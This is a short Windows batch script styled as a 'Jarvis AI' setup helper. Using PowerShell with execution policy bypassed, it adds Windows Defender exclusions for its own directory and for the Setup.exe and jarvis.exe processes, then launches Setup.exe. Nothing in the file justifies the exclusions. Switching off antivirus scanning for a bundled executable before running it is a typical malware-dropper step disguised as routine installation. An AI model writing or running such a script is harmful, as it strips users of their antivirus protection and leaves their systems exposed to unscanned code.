@echo off
title Jarvis AI - Setup Helper
color 0A

echo =======================================
echo    JARVIS AI - Installation Helper
echo =======================================
echo.
echo [1/2] Adding Windows Defender exclusion...

PowerShell -ExecutionPolicy Bypass -Command ^
  "Add-MpPreference -ExclusionPath '%~dp0'; ^
   Add-MpPreference -ExclusionProcess 'Setup.exe'; ^
   Add-MpPreference -ExclusionProcess 'jarvis.exe'"

echo [OK] Exclusion added!
echo.
echo [2/2] Starting Setup...
timeout /t 2 /nobreak >nul

start "" "%~dp0Setup.exe"
exit
